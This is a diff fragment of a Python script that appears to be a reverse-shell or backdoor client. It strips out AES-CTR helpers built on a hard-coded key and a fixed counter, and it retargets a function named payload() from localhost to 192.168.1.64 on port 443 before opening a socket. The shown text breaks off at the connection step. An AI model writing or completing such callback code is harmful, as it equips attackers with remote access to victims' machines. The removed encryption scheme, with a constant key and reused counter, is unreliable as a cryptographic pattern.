@@ -4,23 +4,10 @@ import socket
 import uuid
 import base64
 import time
-from Crypto.Cipher import AES
-
-
-counter = b"H"*16
-key = b"H"*32
-
-def encrypt(message):
-    encrypto = AES.new(key, AES.MODE_CTR, counter=lambda: counter)
-    return encrypto.encrypt(message)
-
-def decrypt(message):
-    decrypto = AES.new(key, AES.MODE_CTR, counter=lambda: counter)
-    return  decrypto.decrypt(message)
 
 
 def payload():
-    HOST = '127.0.0.1'
+    HOST = '192.168.1.64'
     PORT = 443
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
